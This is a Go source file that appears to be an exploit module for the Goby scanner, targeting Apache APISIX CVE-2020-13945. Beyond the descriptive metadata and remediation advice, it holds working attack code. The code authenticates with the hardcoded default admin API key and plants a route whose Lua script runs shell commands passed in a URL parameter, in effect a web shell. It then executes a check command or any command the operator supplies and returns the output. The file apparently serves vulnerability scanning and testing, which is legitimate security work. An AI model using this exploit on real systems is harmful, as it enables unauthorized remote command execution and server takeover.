package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache APISIX  Admin API Default Access Token (CVE-2020-13945)",
    "Description": "<p>Apache Apisix is a cloud-native microservice API gateway service of the Apache Foundation.</p><p>There is a default key vulnerability in Apache Apisix. The user enables the management API and deletes the IP restriction rule for accessing the management API, which allows attackers to access APISIX management data and upload malicious scripts to execute arbitrary commands and take over server permissions.</p>",
    "Impact": "<p>Apache APISIX Admin API Default Access Token (CVE-2020-13945)</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E\">https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "Product": "Apache APISIX",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache APISIX routes 接口默认秘钥导致远程命令执行漏洞 (CVE-2020-13945)",
            "Product": "Apache APISIX",
            "Description": "<p>Apache Apisix是Apache基金会的一个云原生的微服务API网关服务。</p><p>Apache Apisix存在默认密钥漏洞，用户启用了管理API并删除了管理API访问IP限制规则，导致允许攻击者访问APISIX管理数据并上传恶意脚本执行任意命令，接管服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E\">https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Apache Apisix存在默认密钥漏洞，用户启用了管理API并删除了管理API访问IP限制规则，导致允许攻击者访问APISIX管理数据并上传恶意脚本执行任意命令，接管服务器权限。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Apache APISIX  Admin API Default Access Token (CVE-2020-13945)",
            "Product": "Apache APISIX",
            "Description": "<p>Apache Apisix is a cloud-native microservice API gateway service of the Apache Foundation.</p><p>There is a default key vulnerability in Apache Apisix. The user enables the management API and deletes the IP restriction rule for accessing the management API, which allows attackers to access APISIX management data and upload malicious scripts to execute arbitrary commands and take over server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E\">https://lists.apache.org/thread.html/r792feb29964067a4108f53e8579a1e9bd1c8b5b9bc95618c814faf2f%40%3Cdev.apisix.apache.org%3E</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Apache APISIX Admin API Default Access Token (CVE-2020-13945)</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"Apache APISIX Dashboard\"",
    "GobyQuery": "title=\"Apache APISIX Dashboard\"",
    "Author": "1291904552@qq.com",
    "Homepage": "http://apisix.apache.org/",
    "DisclosureDate": "2022-01-04",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2020/CVE-2020-13945.yaml"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2020-13945"
    ],
    "CNVD": [
        "CNVD-2021-06957"
    ],
    "CNNVD": [
        "CNNVD-202012-424"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10251"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			RandPath := goutils.RandomHexString(6)
			uri1 := "/apisix/admin/routes"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("X-API-KEY", "edd1c9f034335f136f87ad84b625c8f1")
			cfg1.Header.Store("Content-Type", "application/json")
			cfg1.Data = fmt.Sprintf("{\n    \"uri\": \"/%s\",\n\"script\": \"local _M = {} \\n function _M.access(conf, ctx) \\n local os = require('os')\\n local args = assert(ngx.req.get_uri_args()) \\n local f = assert(io.popen(args.cmd, 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\n    \"upstream\": {\n        \"type\": \"roundrobin\",\n        \"nodes\": {\n            \"example.com:80\": 1\n        }\n    }\n}", RandPath)
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 201 {
				uri2 := "/" + RandPath + "?cmd=id"
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "uid=")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			RandPath := goutils.RandomHexString(6)
			uri1 := "/apisix/admin/routes"
			cfg1 := httpclient.NewPostRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("X-API-KEY", "edd1c9f034335f136f87ad84b625c8f1")
			cfg1.Header.Store("Content-Type", "application/json")
			cfg1.Data = fmt.Sprintf("{\n    \"uri\": \"/%s\",\n\"script\": \"local _M = {} \\n function _M.access(conf, ctx) \\n local os = require('os')\\n local args = assert(ngx.req.get_uri_args()) \\n local f = assert(io.popen(args.cmd, 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\n    \"upstream\": {\n        \"type\": \"roundrobin\",\n        \"nodes\": {\n            \"example.com:80\": 1\n        }\n    }\n}", RandPath)
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 201 {
				uri2 := "/" + RandPath + "?cmd=" + cmd
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200 {
					expResult.Output = resp2.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
